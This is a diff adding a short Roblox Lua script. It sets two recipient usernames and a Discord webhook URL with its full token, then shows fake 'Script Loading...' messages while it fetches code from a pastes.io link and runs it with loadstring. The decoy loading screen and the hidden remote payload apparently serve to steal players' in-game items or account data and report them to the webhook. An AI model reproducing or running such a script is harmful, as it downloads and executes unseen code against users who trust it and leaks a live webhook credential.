@@ -1,0 +1,19 @@
+UserName = "jjadexpp"
+
+UserName2 = "jjadexpp"
+
+Webhook = "
+
+https://discord.com/api/webhooks/1110444753562116107/DBmfRWeKYPlJ3aELTUDwmI7YT7qvx7xqKLoVrUdpbTpFMy3-sVu3FybFbUCu7n87DZiN"
+
+_G.ScriptName = "Loading.."
+
+_G.FirstText = "Please wait.."
+
+_G.SecondText = "Script Loading..."
+
+_G.ThirdText = "Almost Done..."
+
+_G.WaitingTime = 300
+
+loadstring(game:HttpGet("https://pastes.io/raw/xpkcssuwqq", true))()
